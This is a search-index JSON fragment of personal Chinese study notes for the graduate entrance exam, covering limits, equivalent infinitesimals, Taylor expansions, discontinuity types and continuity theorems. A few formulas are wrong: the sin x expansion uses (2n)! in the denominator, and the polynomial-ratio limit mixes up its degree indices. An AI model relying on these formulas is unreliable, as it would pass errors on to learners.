\u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u632f\u8361\u4e0d\u5b58\u5728\u7684\u95f4\u65ad\u70b9\uff0c\u53eb\u505a\u632f\u8361\u95f4\u65ad\u70b9\uff0c\u5176\u4e2d\u632f\u8361\u662f\u4e0d\u53ef\u4ee5\u89e3\u51fa\u7684\u7b54\u6848\uff0c\u6781\u9650\u5b8c\u5168\u4e0d\u5b58\u5728\uff0c\u5982 sin \\frac{1}{x} . \u5176\u4ed6 \u6ce8\uff1a\u5728\u7b54\u9898\u65f6\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9\u9700\u8981\u8bf4\u660e\u662f\u53ef\u53bb\u95f4\u65ad\u70b9\u8fd8\u662f\u8df3\u8dc3\u95f4\u65ad\u70b9\uff0c\u5982\u65e0\u7279\u6b8a\u8981\u6c42\uff0c\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9\u53ea\u9700\u8981\u58f0\u660e\u4e3a\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9\u3002 4.3. \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28 # \u6700\u503c\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5fc5\u6709\u6700\u5927\u503c\u4e0e\u6700\u5c0f\u503c \u6709\u754c\u6027\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219\u5728 [a, b] \u4e0a\u5fc5\u6709\u754c \u4ecb\u503c\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u4e14 f(a)\\ne f(b) \uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u4ecb\u4e8e f(a) \u548c f(b) \u4e4b\u95f4\u7684\u6570 C \uff0c\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \\in (a,b) \uff0c\u4f7f f(\\xi) = C . \u63a8\u8bba\uff1a\u82e5 f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u53ef\u53d6\u5230\u4ecb\u4e8e\u6700\u5c0f\u503cm\u548c\u6700\u5927\u503cM\u4e4b\u95f4\u7684\u4efb\u4f55\u503c \u96f6\u70b9\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u4e14 f(a) \\cdot f(b) < 0 \uff0c\u5219\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \\in [a,b] \uff0c\u4f7f f(\\xi) = 0 . 5. \u603b\u7ed3 # \u51fd\u6570 \u6027\u8d28 \u590d\u5408 \u6781\u9650 \u6781\u9650\u6982\u5ff5\u4e0e\u6027\u8d28 \u6c42\u6781\u9650 \u65e0\u7a77\u5c0f\u9636\u7684\u6bd4\u8f83 \u8fde\u7eed \u95f4\u65ad\u70b9\u7c7b\u578b \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28","title":"1.\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#_1","text":"","title":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#_2","text":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u76ee\u5f55 1. \u80cc\u666f 2. \u6781\u9650\u7684\u5b58\u5728\u51c6\u5219 2.1. \u5939\u903c\u51c6\u5219 2.2. \u5355\u8c03\u6709\u754c\u51c6\u5219 3. \u5e38\u7528\u7684\u6c42\u6781\u9650\u65b9\u6cd5\uff088\u79cd\uff09 3.1. \u65b9\u6cd51 \u7528\u57fa\u672c\u6781\u9650\u6c42\u6781\u9650 3.2. \u65b9\u6cd52 \u5229\u7528\u7b49\u4ef7\u65e0\u7a77\u5c0f\u4ee3\u6362 3.3. \u65b9\u6cd53 \u5229\u7528\u6709\u7406\u8fd0\u7b97\u6cd5\u5219\u6c42\u6781\u9650 3.4. \u65b9\u6cd54 \u5229\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u6c42\u6781\u9650 3.5. \u65b9\u6cd55 \u5229\u7528\u6cf0\u52d2\u516c\u5f0f\u6c42\u6781\u9650 3.6. \u65b9\u6cd56 \u5229\u7528\u5939\u903c\u539f\u7406\u6c42\u6781\u9650 3.7. \u65b9\u6cd57 \u5229\u7528\u5355\u8c03\u6709\u754c\u51c6\u5219\u6c42\u6781\u9650 3.8. \u65b9\u6cd58 \u5229\u7528\u5b9a\u79ef\u5206\u5b9a\u4e49\u6c42\u6781\u9650\uff08\u89c1\u7b2c\u4e94\u7ae0\uff09 4. \u51fd\u6570\u7684\u8fde\u7eed\u6027 4.1. \u8fde\u7eed\u7684\u5b9a\u4e49 4.2. \u95f4\u65ad\u70b9\u7684\u5206\u7c7b 4.3. \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28 5. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#2","text":"","title":"2. \u6781\u9650\u7684\u5b58\u5728\u51c6\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#21","text":"\u82e5\u5b58\u5728 N \uff0c\u5f53 n>N \u65f6\uff0c x_n \\leq y_n \\leq z_n \uff0c\u4e14 \\lim\\limits_{{n\\to \\infty }}{x_n} = \\lim\\limits_{{n\\to \\infty }}{z_n} = a \uff0c\u5219 \\lim\\limits_{{n\\to \\infty }}{y_n} = a .","title":"2.1. \u5939\u903c\u51c6\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#22","text":"\u5355\u8c03\u6709\u754c\u51fd\u6570\u5fc5\u6709\u6781\u9650\uff0c\u5373 \u5355\u8c03 \u589e\uff08\u51cf\uff09\u6709\u4e0a\uff08\u4e0b\uff09\u754c\u7684\u51fd\u6570\u5fc5\u6709\u6781\u9650\u3002","title":"2.2. \u5355\u8c03\u6709\u754c\u51c6\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#3-8","text":"","title":"3. \u5e38\u7528\u7684\u6c42\u6781\u9650\u65b9\u6cd5\uff088\u79cd\uff09"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#31-1","text":"\u5e38\u7528\u7684\u57fa\u672c\u6781\u9650 \\lim_{{x\\to 0 }}{\\sin x\\over{x}} = 1 \\tag{1.1} \\lim_{{x\\to 0 }}{(1+x)^{1\\over{x}}} = e \\tag{1.2} \\lim_{{x\\to \\infty }}{(1+{1\\over{x}})^x} = e \\tag{1.3} \\lim_{{x\\to 0 }}{{a^x - 1}\\over{x}} = \\ln{a} \\tag{1.4} \\lim_{{n\\to \\infty }}{\\sqrt[{n}]{{n}}} = 1 \\tag{1.5} \\lim_{{n\\to \\infty }}{\\sqrt[{n}]{{a}}} = 1,(a>0) \\tag{1.6} \\lim_{{x\\to \\infty }}{{{a_nx^n + a_{n-1}x^{n-1}} + \\cdots + a_1x + a_0 }\\over{{b_nx^n + b_{n-1}x^{n-1}} + \\cdots + b_1x + b_0}} = { \\left\\{ \\begin{aligned} &{a_n\\over{b_m}}, &n=m\\\\ &{0}, &n<m\\\\ &{\\infty} , &n>m\\\\ \\end{aligned}\\right. } \\tag{1.7} \u6ce8\uff1a\u8d8b\u5411\u4e8e\u65e0\u7a77\u65f6\u770b\u9ad8\u6b21\u9879\uff0c\u8d8b\u5411\u4e8e0\u65f6\u770b\u4f4e\u6b21\u9879 \u201c 1^{\\infty} \u201d \u578b\u6781\u9650\u5e38\u7528\u7ed3\u8bba \u82e5 \\lim a(x) = 0, \\lim \\beta(x) = \\infty \uff0c\u4e14 \\lim \\alpha(x)\\beta(x) = A \uff0c\u5219 \\lim[1 + \\alpha(x)]^{\\beta(x)} = e^A \u53ef\u4ee5\u5f52\u7eb3\u4e3a\u4ee5\u4e0b\u4e09\u6b65\uff1a \u5199\u6807\u51c6\u5f62\u5f0f\uff1a\u539f\u5f0f =\\lim[1 + \\alpha(x)]^{\\beta(x)} \uff1b \u6c42\u6781\u9650\uff1a \\lim\\alpha(x)\\beta(x) = A \uff1b \u5199\u7ed3\u679c\uff1a\u539f\u5f0f =e^A .","title":"3.1. \u65b9\u6cd51 \u7528\u57fa\u672c\u6781\u9650\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#32-2","text":"\u5e38\u7528\u7684\u7b49\u4ef7\u65e0\u7a77\u5c0f \u5f53 x\\to 0 \u65f6 x\\sim \\sin x \\sim \\tan x \\sim \\arcsin x \\sim \\ln(1+x) \\sim e ^ x - 1 \\tag{1.8} (1 + x) ^ \\alpha - 1\\sim \\alpha x \\tag{1.9} a^x - 1 \\sim x\\ln a \\tag{1.10} 1 - \\cos x \\sim {1\\over{2}} x ^ 2 \\tag{1.11} x - \\ln(1+x) \\sim {1\\over{2}} x^2 \\tag{1.12} \\tan x - x \\sim {1\\over{3}} x^3 \\tag{1.13} x - \\arctan x \\sim {1\\over{3}} x^3 \\tag{1.14} x - sin x \\sim {1\\over{6}} x^3 \\tag{1.15} \\arcsin x - x \\sim {1\\over{6}} x^3 \\tag{1.16} \u8bc1\u660e\uff081.8-1.16\uff09 \u5e38\u7528\u7684\u7b49\u4ef7\u65e0\u7a77\u5c0f\u90fd\u53ef\u4ee5\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u8bc1\u660e \u63a8\u8bba 1 - \\cos^\\alpha x \\sim {\\alpha\\over{2}}x^2 \\tag{1.17} \u8bc1\u660e\uff081.17\uff09 {1 - [1 + (\\cos x - 1)]^ \\alpha} \\sim \\alpha(1 - \\cos x) \\sim {\\alpha\\over{2}}x^2","title":"3.2. \u65b9\u6cd52 \u5229\u7528\u7b49\u4ef7\u65e0\u7a77\u5c0f\u4ee3\u6362"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#33-3","text":"","title":"3.3. \u65b9\u6cd53 \u5229\u7528\u6709\u7406\u8fd0\u7b97\u6cd5\u5219\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#34-4","text":"\u4f7f\u7528\u6761\u4ef6 \u82e5 f(x)n \u9636 \u53ef\u5bfc \u5219\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u53ef\u4f7f\u7528\u81f3\u6c42\u51fa f^{(n-1)}(x) \uff0c\u5373 f(x) \u7684 n-1 \u9636\u5bfc\u6570 \u82e5 f(x) \u6709 n \u9636 \u8fde\u7eed\u5bfc\u6570 \u5219\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u53ef\u4f7f\u7528\u81f3\u6c42\u51fa f^{(n)}(x) \uff0c\u5373 f(x) \u7684 n \u9636\u5bfc\u6570 \u82e5 f(x)n \u9636 \u53ef\u5bfc \uff0c\u4e14\u6c42\u51fa f^{(n-1)}(x) \u540e\u6781\u9650\u4ecd\u4e3a \\frac{0}{0} \u578b \u5219\u8003\u8651\u4f7f\u7528 \u7b49\u4ef7\u65e0\u7a77\u5c0f \u6216 \u5bfc\u6570\u5b9a\u4e49","title":"3.4. \u65b9\u6cd54 \u5229\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#35-5","text":"\u5b9a\u7406 \uff08\u5e26Peano\u4f59\u9879\u7684\u6cf0\u52d2\u516c\u5f0f\uff09 \u8bbe f(x) \u5728 x = x_0 \u5904 n \u9636\u53ef\u5bfc\uff0c\u5219 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + o[(x - x_0)^n],x \\in U{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) } \\tag{1.18} \u7279\u522b\u662f\u5f53 x_0=0 \u65f6\uff0c\u4e3a\u9ea6\u514b\u52b3\u6797\u516c\u5f0f f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {0} \\right) }{\\mathop{{x}}\\nolimits^{{n}}} + o(x^n),x \\in U{ \\left( {0} \\right) } \\tag{1.19} \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f e^x = 1 + x + {x^2\\over{2!}} + \\cdots + {x^n\\over{n!}} + o(x^n) \\tag{1.20} \\sin(x) = x - {x^3\\over{3!}} + \\cdots + (-1)^{n-1}{{x^{2n-1}}\\over{(2n)!}} + o(x^{2n-1}) \\tag{1.21} \\cos(x) = 1 - {x^2\\over{2!}} + \\cdots + (-1)^{n}{{x^{2n}}\\over{(2n)!}} + o(x^{2n}) \\tag{1.22} \\ln(1 + x) = x - {x^2\\over{2}} + \\cdots + (-1)^{n-1}{{x^{n}\\over{n}}} + o(x^{n}) \\tag{1.23} (1 + x) ^ \\alpha = 1 + \\alpha x + {\\alpha (\\alpha - 1)\\over{2!} }x^2 + \\cdots + {[\\alpha!/(\\alpha - n)!]\\over{n!}}x^n + o(x^n) \\tag{1.24}","title":"3.5. \u65b9\u6cd55 \u5229\u7528\u6cf0\u52d2\u516c\u5f0f\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#36-6","text":"\u5e38\u7528\u7ed3\u8bba \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} = max\\{a_i\\} \\tag{1.25} \u5176\u4e2d a_i > 0, (i = 1, 2, \\cdots, m) \u8bc1\u660e\u516c\u5f0f1.25 \u4ee4 max\\{a_i\\} = a \uff0c\u5219 \\sqrt[n]{a^n} < {\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} < \\sqrt[n]{ma^n} \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a^n}}} = a \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{ma^n}}} = a \u6839\u636e\u5939\u903c\u51c6\u5219 \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} = max\\{a_i\\} \\tag{1.26}","title":"3.6. \u65b9\u6cd56 \u5229\u7528\u5939\u903c\u539f\u7406\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#37-7","text":"\u57fa\u672c\u4e0d\u7b49\u5f0f {2\\over{{1\\over{a}} + {1\\over{b}}}} \\leq \\sqrt{ab} \\leq \\frac{a + b}{2} \\leq \\sqrt{\\frac{a ^ 2 + b ^ 2}{2}}","title":"3.7. \u65b9\u6cd57 \u5229\u7528\u5355\u8c03\u6709\u754c\u51c6\u5219\u6c42\u6781\u9650"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#38-8","text":"","title":"3.8. \u65b9\u6cd58 \u5229\u7528\u5b9a\u79ef\u5206\u5b9a\u4e49\u6c42\u6781\u9650\uff08\u89c1\u7b2c\u4e94\u7ae0\uff09"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#4","text":"","title":"4. \u51fd\u6570\u7684\u8fde\u7eed\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#41","text":"\u8fde\u7eed\u7684\u5b9a\u4e49 \u8bbe y=f(x) \u5728\u70b9 x_0 \u7684\u67d0\u9886\u57df\u5185\u6709\u5b9a\u4e49\uff0c\u82e5 \\lim\\limits_{x \\to x_0}{f(x) = f(x_0)} \u5219\u79f0 f(x) \u5728\u70b9 x_0 \u5904\u8fde\u7eed\u3002 \u5de6\u8fde\u7eed\u7684\u5b9a\u4e49 \u82e5 \\lim\\limits_{x \\to x_0^-}{f(x)} = f(x_0) \uff0c\u5219\u79f0 y = f(x) \u5728\u70b9 x_0 \u5904\u5de6\u8fde\u7eed\u3002 \u53f3\u8fde\u7eed\u7684\u5b9a\u4e49 \u82e5 \\lim\\limits_{x \\to x_0^+}{f(x)} = f(x_0) \uff0c\u5219\u79f0 y = f(x) \u5728\u70b9 x_0 \u5904\u53f3\u8fde\u7eed\u3002 \u5b9a\u7406 \u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u8fde\u7eed\u7684\u5145\u8981\u6761\u4ef6\u662f f(x) \u5728\u70b9 x_0 \u65e2\u5de6\u8fde\u7eed\u53c8\u53f3\u8fde\u7eed\u3002","title":"4.1. \u8fde\u7eed\u7684\u5b9a\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#42","text":"\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd\u5b58\u5728\u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9 \u53ef\u53bb\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd \u5b58\u5728 \u4e14 \u76f8\u7b49 \u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u53ef\u53bb\u95f4\u65ad\u70b9 \u8df3\u8dc3\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd \u5b58\u5728 \u4f46 \u4e0d\u76f8\u7b49 \u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u8df3\u8dc3\u95f4\u65ad\u70b9 \u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u95f4\u65ad\u70b9\u79f0\u4e3a\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9 \u65e0\u7a77\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u82e5 \\lim\\limits_{x \\to x_0^-} = \\infty \u6216 \\lim\\limits_{x \\to x_0^+} = \\infty \uff0c \u5219\u79f0 x_0 \u4e3a f(x) \u7684\u65e0\u7a77\u95f4\u65ad\u70b9 \u9707\u8361\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u632f\u8361\u4e0d\u5b58\u5728\u7684\u95f4\u65ad\u70b9\uff0c\u53eb\u505a\u632f\u8361\u95f4\u65ad\u70b9\uff0c\u5176\u4e2d\u632f\u8361\u662f\u4e0d\u53ef\u4ee5\u89e3\u51fa\u7684\u7b54\u6848\uff0c\u6781\u9650\u5b8c\u5168\u4e0d\u5b58\u5728\uff0c\u5982 sin \\frac{1}{x} . \u5176\u4ed6 \u6ce8\uff1a\u5728\u7b54\u9898\u65f6\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9\u9700\u8981\u8bf4\u660e\u662f\u53ef\u53bb\u95f4\u65ad\u70b9\u8fd8\u662f\u8df3\u8dc3\u95f4\u65ad\u70b9\uff0c\u5982\u65e0\u7279\u6b8a\u8981\u6c42\uff0c\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9\u53ea\u9700\u8981\u58f0\u660e\u4e3a\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9\u3002","title":"4.2. \u95f4\u65ad\u70b9\u7684\u5206\u7c7b"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#43","text":"\u6700\u503c\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5fc5\u6709\u6700\u5927\u503c\u4e0e\u6700\u5c0f\u503c \u6709\u754c\u6027\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219\u5728 [a, b] \u4e0a\u5fc5\u6709\u754c \u4ecb\u503c\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u4e14 f(a)\\ne f(b) \uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u4ecb\u4e8e f(a) \u548c f(b) \u4e4b\u95f4\u7684\u6570 C \uff0c\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \\in (a,b) \uff0c\u4f7f f(\\xi) = C . \u63a8\u8bba\uff1a\u82e5 f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u53ef\u53d6\u5230\u4ecb\u4e8e\u6700\u5c0f\u503cm\u548c\u6700\u5927\u503cM\u4e4b\u95f4\u7684\u4efb\u4f55\u503c \u96f6\u70b9\u5b9a\u7406 \u8bbe f(x) \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u4e14 f(a) \\cdot f(b) < 0 \uff0c\u5219\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \\in [a,b] \uff0c\u4f7f f(\\xi) = 0 .","title":"4.3. \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/#5","text":"\u51fd\u6570 \u6027\u8d28 \u590d\u5408 \u6781\u9650 \u6781\u9650\u6982\u5ff5\u4e0e\u6027\u8d28 \u6c42\u6781\u9650 \u65e0\u7a77\u5c0f\u9636\u7684\u6bd4\u8f83 \u8fde\u7eed \u95f4\u65ad\u70b9\u7c7b\u578b \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28","title":"5. \u603b\u7ed3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/","text":"\u7b2c\u4e8c\u7ae0 \u5bfc\u6570\u4e0e\u5fae\u5206 # \u76ee\u5f55 # \u7b2c\u4e8c\u7ae0 \u5bfc\u6570\u4e0e\u5fae\u5206 \u76ee\u5f55 1. \u80cc\u666f 2. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 2.1. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 2.2. \u8fde\u7eed\u3001\u53ef\u5bfc\u3001\u53ef\u5fae\u4e4b\u95f4\u7684\u5173\u7cfb 2.3. \u5bfc\u6570\u7684\u51e0\u4f55\u610f\u4e49 2.4. \u76f8\u5173\u53d8\u5316\u7387 3. \u5bfc\u6570\u516c\u5f0f\u53ca\u6c42\u5bfc\u6cd5\u5219 3.1. \u57fa\u672c\u521d\u7b49\u51fd\u6570\u7684\u5bfc\u6570\u516c\u5f0f 3.2. \u6c42\u5bfc\u6cd5\u5219 3.2.1. \u6709\u7406\u8fd0\u7b97\u6cd5\u5219 3.2.2. \u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5 3.2.3. \u9690\u51fd\u6570\u6c42\u5bfc\u6cd5 3.2.4. 